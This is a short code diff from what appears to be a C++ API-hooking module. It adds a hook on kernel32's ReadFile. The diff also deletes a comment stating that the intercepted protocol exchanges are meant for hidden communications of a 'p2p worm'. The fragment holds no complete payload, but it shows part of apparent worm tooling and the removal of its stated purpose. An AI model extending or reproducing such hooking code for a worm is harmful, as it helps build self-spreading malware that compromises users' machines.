@@ -83,7 +83,6 @@ int Hooks::Init() {
 	
 	// *** FIX add WriteFile/send/etc (both sides of the protocols)
 	// for later.. so we can use these same exact
-	// protocol exchanges for creating new hidden communications for the p2p worm
 	APIHook *hptr = NULL;
 	// Add Kernel32.dll -> ReadFile(hFile,lpBuffer,ToRead,Read,lpOver);
 	hptr = HookFunction(NULL,"kernel32", "ReadFile", 0, 1, 1);
